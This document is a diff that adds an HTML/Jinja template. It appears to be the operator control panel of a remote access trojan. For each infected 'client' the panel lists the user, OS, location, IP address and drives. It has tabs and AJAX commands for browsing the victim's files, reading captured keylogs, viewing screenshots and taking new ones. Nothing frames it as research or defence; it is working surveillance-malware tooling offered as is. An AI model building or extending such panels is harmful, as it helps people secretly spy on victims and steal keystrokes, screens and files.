@@ -1,0 +1,194 @@
+{% extends "layout.html" %}
+{% block title %}
+Client Menu
+{% endblock %}
+
+
+{% block main %}
+<!-- args:json_list,client,con_list,con_info,user_name,client_db -->
+<div class="card">
+    <div class="card-body">
+        <h2 class="display-4">{{con_info[client]["user"]}} on {{con_info[client]["os"]}}</h2>
+<small class="text-muted">Status: <span class="badge badge-success">Online</span></small>
+        <p class="lead">From {{con_info[client]["location"]}}</p>
+        <small class="text-muted">{{con_list[client][1][0]}}:{{con_list[client][1][1]}}</small><br>
+        <small class="text-muted">Last Seen: {{ client_db['last_seen'] }}</small><br>
+        <small class="text-muted">Date Added: {{ client_db['date_added'] }}</small>
+    </div>
+</div>
+
+<hr class="my-4">
+
+<div class="row">
+
+    <div class="col-3">
+
+        <div class="nav flex-column nav-pills" id="v-pills-tab" role="tablist" aria-orientation="vertical">
+            <a class="nav-link active" id="hdd" data-toggle="pill" href="#list-hdd" role="tab" aria-controls="list-hdd" aria-selected="true">Drives</a>
+            <a class="nav-link" id="files" data-toggle="pill" href="#list-files" role="tab" aria-controls="list-files" aria-selected="false"onclick="hideFiles();">Downloaded Files</a>
+            <a class="nav-link" id="keys" data-toggle="pill" href="#list-keys" role="tab" aria-controls="list-keys" aria-selected="false" onclick="hideFiles();">KeyLogs</a>
+            <a class="nav-link" id="screens" data-toggle="pill" href="#list-screens" role="tab" aria-controls="list-screens" aria-selected="false" onclick="hideFiles();">ScreenShots</a>
+        </div>
+        <hr class="my-4">
+        <button type="button" id="screen-shot" class="btn btn-primary" style="width:100%;">Take a ScreenShot</button>
+
+    </div>
+    <div class="col-9">
+        <div class="tab-content" id="v-pills-tabContent">
+
+            <div class="tab-pane fade show active" id="list-hdd" role="tabpanel" aria-labelledby="hdd">
+                <div class="nav flex-column nav-pills" id="v-pills-tab2" role="tablist" aria-orientation="vertical">
+
+                    {% for k in json_list %}
+
+                    <a class="nav-link" id={{k["drive_name"]}} data-toggle="pill" href="#list-files-hdd" role="tab" aria-controls="list-files-hdd" aria-selected="false">
+                        Drive: {{k["drive_name"]}} Type: {{k["drive_type"]}} Total: {{k["drive_total"]}}GB Free: {{k["drive_free"]}}GB
+                    </a>
+
+                    {% endfor %}
+
+                </div>
+
+            </div>
+            <div class="tab-pane fade" id="list-files" role="tabpanel" aria-labelledby="files">
+                
+            </div>
+            
+            <div class="tab-pane fade" id="list-keys" role="tabpanel" aria-labelledby="keys">
+                
+            </div>
+            
+            <div class="tab-pane fade" id="list-screens" role="tabpanel" aria-labelledby="screens">
+                
+            </div>
+        </div>
+    </div>
+
+</div>
+<div class="row">
+    <div class="container-fluid">
+        <div class="tab-content" id="nav-tab">
+            <div class="tab-pane fade show" id="list-files-hdd" role="tabpanel"></div>
+        </div>
+    </div>
+</div>
+<hr class="my-4">
+<script type="text/javascript">
+    //send ajax request and display hdd list
+    $('#v-pills-tab2 a').click(function() {
+        var path = this.id;
+        var data = JSON.stringify({
+            client: "{{ client }}",
+            path: path
+        });
+        console.log(data);
+        console.log(path);
+        $.ajax({
+
+                type: "POST",
+                url: "{{ url_for('dirList') }}",
+                data: data,
+                contentType: 'application/json;charset=UTF-8',
+
+            })
+            .done(function(msg) {
+                console.log(msg);
+                $('#list-files-hdd').html(msg);
+            })
+    });
+    //send ajax request to make a screenshot
+    $('#screen-shot').click(function(){
+        var data = JSON.stringify({
+            client:"{{client}}",
+            cmd:"screen_shot"
+        });
+        
+        $.ajax({
+            
+            type: "POST",
+            url: "{{ url_for('actions') }}",
+            data: data,
+            contentType: 'application/json;charset=UTF-8',
+        })
+        .done(function(msg) {
+            //animate the button to let user know something happened
+            console.log(msg);
+            $('#screen-shot').fadeOut(400, function(){
+              $('#screen-shot').html(msg).fadeIn(400);  
+            });
+            
+            setTimeout(function(){
+                $('#screen-shot').fadeOut(400, function(){
+              $('#screen-shot').html('Take a ScreenShot').fadeIn(400);
+                })
+            },800);
+        });
+                                                
+    });
+    
+    $('#files').click(function(){
+       var data = JSON.stringify({
+           client:"{{ user_name }}",
+           cmd:"local_files",
+       });
+    console.log(data);
+    $.ajax({
+        
+        type: "POST",
+        url: "{{ url_for('actions') }}",
+        data:data,
+        contentType: 'application/json;charset=UTF-8',
+        beforeSend: function(){
+            $('#list-files').html('<i class="fas fa-spinner fa-spin"></i>');
+        }
+        
+    })
+    .done(function(msg){
+       $('#list-files').html(msg); 
+    });
+    });
+    
+    $('#keys').click(function(){
+        var data = JSON.stringify({
+            client: "{{ user_name }}",
+            cmd: "local_keylogs",
+        });
+        console.log(data);
+        $.ajax({
+            
+            type: "POST",
+            url: "{{ url_for('actions') }}",
+            data: data,
+            contentType: 'application/json;charset=UTF-8',
+            beforeSend: function(){
+                $('#list-keys').html('<i class="fas fa-spinner fa-spin"></i>');
+            }
+        })
+        .done(function(msg){
+           $('#list-keys').html(msg); 
+        });
+    });
+    
+    $('#screens').click(function(){
+        var data = JSON.stringify({
+            client: "{{ user_name }}",
+            cmd: "local_screenshots",
+        });
+        console.log(data);
+        $.ajax({
+            
+            type: "POST",
+            url: "{{ url_for('actions') }}",
+            data: data,
+            contentType: 'application/json;charset=UTF-8',
+            beforeSend: function(){
+                $('#list-screens').html('<i class="fas fa-spinner fa-spin"></i>');
+            }
+        })
+        .done(function(msg){
+           $('#list-screens').html(msg); 
+        });
+    });
+    
+</script>
+{% endblock %}
